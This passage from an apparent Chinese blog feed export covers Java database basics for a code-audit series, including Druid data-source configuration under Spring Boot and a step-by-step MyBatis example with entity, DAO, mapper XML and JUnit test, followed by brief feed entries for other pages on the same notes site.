的一些好处：</p>\n<ol>\n<li>连接池管理：数据源提供了连接池的功能，可以在应用程序启动时创建一组数据库连接并放入连接池中。这样，在需要连接数据库时，可以从连接池中获取连接，而不是每次都创建新的连接和断开连接。连接池可以有效地管理和重用连接，提高性能和响应速度。</li>\n<li>连接参数配置：数据源允许你将连接参数配置在一个地方，而不是在每个数据库连接的地方单独设置。这样可以简化代码，并提供一种集中管理连接参数的方式，方便进行统一的配置和修改。</li>\n<li>连接错误处理：数据源可以处理连接错误和异常情况，例如网络中断、数据库崩溃等。当连接发生错误时，数据源可以自动处理连接的关闭和重新建立，确保应用程序的稳定性和可靠性。</li>\n<li>并发控制：数据源可以提供并发控制机制，以限制同时使用的数据库连接数。这样可以避免过多的连接导致数据库性能下降，并提供一种资源控制的方式，确保数据库连接的合理使用。</li>\n<li>支持事务管理：数据源可以与事务管理器（如 JavaEE 中的 JTA）集成，提供对事务的支持。它可以管理连接的事务性，包括事务的开始、提交和回滚，确保数据的一致性和完整性</li>\n</ol>\n<blockquote>\n<p>以上来自chatGPT</p>\n</blockquote>\n<p>常见的数据源有：<code>DBCP</code>、<code>C3P0</code>、<code>Druid</code>、<code>Mybatis DataSource</code>，他们都实现于<code>javax.sql.DataSource</code>接口。</p>\n<p>如下为druid数据源的一个例子: pom.xml</p>\n<div class=\"language-xml\" data-ext=\"xml\" data-title=\"xml\"><pre class=\"language-xml\"><code><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;</span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>project</span> <span class=\"token attr-name\">xmlns</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://maven.apache.org/POM/4.0.0<span class=\"token punctuation\">\"</span></span>\n         <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>xsi</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://www.w3.org/2001/XMLSchema-instance<span class=\"token punctuation\">\"</span></span>\n         <span class=\"token attr-name\"><span class=\"token namespace\">xsi:</span>schemaLocation</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>modelVersion</span><span class=\"token punctuation\">&gt;</span></span>4.0.0<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>modelVersion</span><span class=\"token punctuation\">&gt;</span></span>\n\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>org.example<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>Database<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">&gt;</span></span>1.0-SNAPSHOT<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">&gt;</span></span>\n\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>properties</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>maven.compiler.source</span><span class=\"token punctuation\">&gt;</span></span>8<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>maven.compiler.source</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>maven.compiler.target</span><span class=\"token punctuation\">&gt;</span></span>8<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>maven.compiler.target</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>project.build.sourceEncoding</span><span class=\"token punctuation\">&gt;</span></span>UTF-8<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>project.build.sourceEncoding</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>properties</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>parent</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>org.springframework.boot<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>spring-boot-starter-parent<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">&gt;</span></span>1.5.2.RELEASE<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>relativePath</span><span class=\"token punctuation\">/&gt;</span></span> <span class=\"token comment\">&lt;!-- lookup parent from repository --&gt;</span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>parent</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependencies</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>org.springframework.boot<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>spring-boot-starter-thymeleaf<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>org.springframework.boot<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>spring-boot-starter-jdbc<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>mysql<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>mysql-connector-java<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>com.alibaba<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>druid<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">&gt;</span></span>1.0.19<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>org.springframework.boot<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>spring-boot-starter-test<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>scope</span><span class=\"token punctuation\">&gt;</span></span>test<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>scope</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependencies</span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>project</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>然后是配置文件application.properties</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code># 数据源配置\nspring.thymeleaf.cache=false\nspring.datasource.url=jdbc:mysql://localhost:3306/CodeAudit?useUnicode=true&amp;characterEncoding=utf-8\nspring.datasource.username=root\nspring.datasource.password=123456\nspring.datasource.driver-class-name=com.mysql.jdbc.Driver\n\n# Druid 连接池配置\nspring.datasource.type=com.alibaba.druid.pool.DruidDataSource\nspring.datasource.initial-size=5\nspring.datasource.min-idle=5\nspring.datasource.max-active=20\nspring.datasource.max-wait=60000\nspring.datasource.time-between-eviction-runs-millis=60000\nspring.datasource.min-evictable-idle-time-millis=300000\nspring.datasource.validation-query=SELECT 1\nspring.datasource.test-while-idle=true\nspring.datasource.test-on-borrow=false\nspring.datasource.test-on-return=false\nspring.datasource.pool-prepared-statements=true\nspring.datasource.max-pool-prepared-statement-per-connection-size=20\nspring.datasource.filters=stat,wall,log4j\nspring.datasource.connection-properties=druid.stat.mergeSql=true;druid.stat.slowSqlMillis=5000\n\n# 其他应用配置...\n</code></pre></div><blockquote>\n<p>此处配置文件如果没写这么多，可以在后面代码注释掉的地方进行数据源的配置</p>\n</blockquote>\n<p>spring的启动函数</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>package com.echo0d;\n\n/**\n * @author : echo0d\n * @date : 2023/12/31 14:07\n * @Description :\n */\nimport com.alibaba.druid.pool.DruidDataSource;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.core.env.Environment;\n\nimport javax.sql.DataSource;\n\n@SpringBootApplication\npublic class Application {\n    public static void main(String[] args) {\n        SpringApplication.run(Application.class, args);\n    }\n//    @Autowired\n//    private Environment env;\n//\n//    //destroy-method=\"close\"的作用是当数据库连接不使用的时候,就把该连接重新放到数据池中,方便下次使用调用.\n//    @Bean(destroyMethod =  \"close\")\n//    public DataSource dataSource() {\n//        DruidDataSource dataSource = new DruidDataSource();\n//        dataSource.setUrl(env.getProperty(\"spring.datasource.url\"));\n//        dataSource.setUsername(env.getProperty(\"spring.datasource.username\"));//用户名\n//        dataSource.setPassword(env.getProperty(\"spring.datasource.password\"));//密码\n//        dataSource.setDriverClassName(env.getProperty(\"spring.datasource.driver-class-name\"));\n//        dataSource.setInitialSize(2);//初始化时建立物理连接的个数。初始化发生在显示调用init方法，或者第一次getConnection时\n//        dataSource.setMaxActive(20);//最大连接池数量\n//        dataSource.setMinIdle(0);//最小连接池数量\n//        dataSource.setMaxWait(60000);//获取连接时最大等待时间，单位毫秒。配置了maxWait之后，缺省启用公平锁，并发效率会有所下降，如果需要可以通过配置useUnfairLock属性为true使用非公平锁。\n//        dataSource.setValidationQuery(\"SELECT 1\");//用来检测连接是否有效的sql，要求是一个查询语句，常用select 'x'。如果validationQuery为null，testOnBorrow、testOnReturn、testWhileIdle都不会其作用。\n//        dataSource.setTestOnBorrow(false);//申请连接时执行validationQuery检测连接是否有效，做了这个配置会降低性能。\n//        dataSource.setTestWhileIdle(true);//建议配置为true，不影响性能，并且保证安全性。申请连接的时候检测，如果空闲时间大于timeBetweenEvictionRunsMillis，执行validationQuery检测连接是否有效。\n//        dataSource.setPoolPreparedStatements(false);//是否缓存preparedStatement，也就是PSCache。PSCache对支持游标的数据库性能提升巨大，比如说oracle。在mysql下建议关闭。\n//        return dataSource;\n//    }\n}\n\n</code></pre></div><h2>2、Mybatis</h2>\n<p>JDBC缺点：</p>\n<ul>\n<li>数据库连接的频繁创建、释放浪费资源进而影响系统性能。</li>\n<li>sql代码写在 Java文件当中，如果在开发过程中我们改动某个sql，就需要去修改Java代码，改完之后还需要重新编译。</li>\n<li>对结果集的解析也是硬编码，sql变化会导致解析结果的代码也跟着变化，系统不易维护</li>\n</ul>\n<h3>2.1 一般步骤</h3>\n<p>先建表</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>CREATE TABLE `user` (\n`id` int(11) NOT NULL auto_increment,\n`username` varchar(32) NOT NULL COMMENT '用户名称',\n`birthday` datetime default NULL COMMENT '生日',\n`sex` char(1) default NULL COMMENT '性别',\n`address` varchar(256) default NULL COMMENT '地址',\nPRIMARY KEY (`id`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n \ninsert into `user`(`id`,`username`,`birthday`,`sex`,`address`) values (1,'老王','2018-02-27\n17:47:08','男','北京'),(2,'熊大','2018-03-02 15:09:37','女','上海'),(3,'熊二','2018-03-04\n11:34:34','女','深圳'),(4,'光头强','2018-03-04 12:04:06','男','广州');\n</code></pre></div><p>整体项目结构如下</p>\n<figure><figcaption>image-20240108213703085</figcaption></figure>\n<p>添加maven依赖</p>\n<div class=\"language-xml\" data-ext=\"xml\" data-title=\"xml\"><pre class=\"language-xml\"><code>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependencies</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token comment\">&lt;!--mybatis核心包--&gt;</span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>org.mybatis<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>mybatis<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">&gt;</span></span>3.4.5<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token comment\">&lt;!--mysql驱动包--&gt;</span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>mysql<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>mysql-connector-java<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">&gt;</span></span>5.1.6<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token comment\">&lt;!-- 单元测试 --&gt;</span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>junit<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>junit<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">&gt;</span></span>4.10<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependencies</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>编写User的实体类</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>package com.echo0d.entity;\nimport java.util.Date;\n\npublic class User  {\n    private Integer id;\n    private String username;\n    private Date birthday;\n    private String sex;\n    private String address;\n    public Integer getId() {\n        return id;\n    }\n    public void setId(Integer id) {\n        this.id = id;\n    }\n    public String getUsername() {\n        return username;\n    }\n    public void setUsername(String username) {\n        this.username = username;\n    }\n    public Date getBirthday() {\n        return birthday;\n    }\n    public void setBirthday(Date birthday) {\n        this.birthday = birthday;\n    }\n    public String getSex() {\n        return sex;\n    }\n    public void setSex(String sex) {\n        this.sex = sex;\n    }\n    public String getAddress() {\n        return address;\n    }\n    public void setAddress(String address) {\n        this.address = address;\n    }\n    @Override\n    public String toString() {\n        return \"User{\" +\n                \"id=\" + id +\n                \", username='\" + username + '\\'' +\n                \", birthday=\" + birthday +\n                \", sex='\" + sex + '\\'' +\n                \", address='\" + address + '\\'' +\n                '}';\n    }\n}\n\n\n</code></pre></div><p>编写UserDao的接口和方法</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>package com.echo0d.dao;\nimport com.echo0d.entity.User;\nimport java.util.List;\n/**\n * 查询用户,两个方法对应两个sql语句，在UserMapper.xml文件中配置sql\n */\npublic interface UserDao {\n    public List&lt;User&gt; findAll();\n\n    User find();\n}\n</code></pre></div><p>在resources目录下，创建mapper文件夹。编写UserDao.xml的配置文件，导入约束文件。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE mapper\n        PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"&gt;\n&lt;mapper namespace=\"com.echo0d.dao.UserDao\"&gt;\n    &lt;select id=\"find\" resultType=\"com.echo0d.entity.User\"&gt;\n        select * from user where id = 1\n    &lt;/select&gt;\n\n\n    &lt;select id =\"findAll\" resultType=\"com.echo0d.entity.User\"&gt;\n        select * from user\n    &lt;/select&gt;\n&lt;/mapper&gt;\n&lt;!-- 1. mapper namespace=\"com.echo0d.dao.UserDao\"，叫名称空间，表明以后查找UserDao接口中的findAll的方法。--&gt;\n&lt;!-- 2. select id=\"findAll\"中的id属性编写的UserDao接口中的方法的名称，固定的。--&gt;\n&lt;!-- 3. resultType=\"com.echo0d.entity.User\"表明的是find和findAll方法的返回值类型--&gt;\n</code></pre></div><p>在resources文件夹下创建mybatis的配置文件，这个文件后面需要在使用mybatis时候引入，例如下面的测试类中</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>&lt;configuration&gt;\n    &lt;environments default=\"mysql\"&gt;\n        &lt;environment id=\"mysql\"&gt;\n            &lt;!--配置事务的类型，使用本地事务策略--&gt;\n            &lt;transactionManager type=\"JDBC\"&gt;&lt;/transactionManager&gt;\n            &lt;!--是否使用连接池 POOLED表示使用链接池，UNPOOLED表示不使用连接池--&gt;\n            &lt;dataSource type=\"POOLED\"&gt;\n                &lt;property name=\"driver\" value=\"com.mysql.jdbc.Driver\"/&gt;\n                &lt;property name=\"url\" value=\"jdbc:mysql://localhost:3306/codeaudit\"/&gt;\n                &lt;property name=\"username\" value=\"root\"/&gt;\n                &lt;property name=\"password\" value=\"123456\"/&gt;\n            &lt;/dataSource&gt;\n        &lt;/environment&gt;\n    &lt;/environments&gt;\n    &lt;mappers&gt;\n&lt;!--        此处填入mapper的配置文件--&gt;\n        &lt;mapper resource=\"mapper/UserMapper.xml\"&gt;&lt;/mapper&gt;\n    &lt;/mappers&gt;\n&lt;/configuration&gt;\n</code></pre></div><p><strong>注意</strong>：一定要完成两个绑定</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>（1）Mapper 接口与 Mapper 映射文件的绑定，在 Mapper 映射文件中的 &lt;mapper&gt; 标签中的 namespace 中必须指定 Mapper 接口的全类名\n\n（2）Mapper 映射文件中的增删改查标签的 id 必须指定 Mapper 接口中的方法名；\n</code></pre></div><p>测试类MyBatisTest.java</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>/**\n * @author : echo0d\n * @date : 2024/1/8 21:14\n * @Description :\n */\npackage com.echo0d.test;\n\nimport com.echo0d.dao.UserDao;\nimport com.echo0d.entity.User;\nimport org.apache.ibatis.io.Resources;\nimport org.apache.ibatis.session.SqlSession;\nimport org.apache.ibatis.session.SqlSessionFactory;\nimport org.apache.ibatis.session.SqlSessionFactoryBuilder;\nimport org.junit.After;\nimport org.junit.Before;\nimport org.junit.Test;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.List;\n\npublic class MyBatisTest {\n\n    private InputStream in = null;\n    private SqlSession session = null;\n    private UserDao mapper = null;\n\n    @Before  //前置通知, 在方法执行之前执行\n    public void init() throws IOException {\n        //加载主配置文件，目的是为了构建SqlSessionFactory对象\n        in = Resources.getResourceAsStream(\"mybatisConfig.xml\");\n        //创建SqlSessionFactory对象\n        SqlSessionFactory factory = new SqlSessionFactoryBuilder().build(in);\n        //通过SqlSessionFactory工厂对象创建SqlSesssion对象\n        session = factory.openSession();\n        //通过Session创建UserDao接口代理对象\n        mapper = session.getMapper(UserDao.class);\n    }\n\n    @After  //@After: 后置通知, 在方法执行之后执行 。\n    public void destroy() throws IOException {\n        //释放资源\n        session.close();\n        in.close();\n    }\n\n    @Test\n    public void find(){\n        User user = mapper.find();\n        System.out.println(user);\n    }\n    @Test\n    public void findAll(){\n        List&lt;User&gt; users = mapper.findAll();\n        for(User user:users){\n            System.out.println(user.toString());\n        }\n    }\n\n}\n</code></pre></div><p>根据全局配置文件得到 sqlSessionFactory；</p>\n<p>使用sqlSession工程，获取到 sqlSession 对象使用他来执行增删改查，一个 sqlSession 就是代表和数据库的一次会话，用完关闭；</p>\n<p>使用 SQL 的唯一标识来告诉 MyBatis 执行那个 SQL，SQL都在保存在 SQL 映射文件中；</p>\n",
      "date_published": "2024-01-03T11:44:30.000Z",
      "date_modified": "2024-08-13T09:55:52.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "echo0d'notes",
      "url": "https://echo0d.github.io/DailyNotes/",
      "id": "https://echo0d.github.io/DailyNotes/",
      "summary": "echo0d's notes\n我的狗😍\nmydogmydog\nmydogmydog",
      "content_html": "\n<p>我的狗😍</p>\n<figure><figcaption>mydog</figcaption></figure>\n<figure><figcaption>mydog</figcaption></figure>\n",
      "date_published": "2023-12-24T03:35:37.000Z",
      "date_modified": "2023-12-28T14:28:49.000Z",
      "authors": [
        {
          "name": "echo0d"
        }
      ],
      "tags": []
    },
    {
      "title": "Java代码审计相关知识",
      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/",
      "summary": "Java代码审计相关知识\n大部分都是抄的《Java代码审计(入门篇)》-- 徐焱主编",
      "content_html": "\n<p>大部分都是抄的《Java代码审计(入门篇)》-- 徐焱主编</p>\n",
      "date_published": "2023-12-24T03:35:37.000Z",
      "date_modified": "2023-12-24T03:35:37.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "1-文件系统",
      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/1-JavaBase/1-FileSystem.html",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/1-JavaBase/1-FileSystem.html",
      "summary": "1-文件系统\n1、Java文件系统\n在Java语言中对文件的任何操作最终都是通过JNI调用C语言函数实现的。Java SE中内置了两类文件系统：java.io和java.nio，java.nio的实现是sun.nio。\nJava为了能够实现跨操作系统对文件进行操作抽象了一个叫做文件系统的对象:java.io.FileSystem，不同的操作系统有不一样...",
